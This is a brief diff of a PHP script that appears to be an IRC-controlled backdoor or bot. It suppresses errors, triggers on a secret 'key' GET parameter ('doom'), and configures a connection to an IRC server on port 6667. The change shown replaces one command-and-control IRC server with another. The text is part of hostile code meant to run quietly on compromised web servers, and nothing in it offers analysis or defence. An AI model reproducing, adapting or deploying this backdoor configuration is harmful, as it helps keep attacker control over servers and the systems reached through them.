@@ -5,7 +5,7 @@ error_reporting(0);
 if(isset($_GET['key']) == "doom") {
     class sell {
         var $config = array(
-					'server' => 'elaine.hackint.org',
+					'server' => 'gaia.sorcery.net',
 					'port' => '6667',
 					"key" => '',
 					'prefix' => 'Linux',
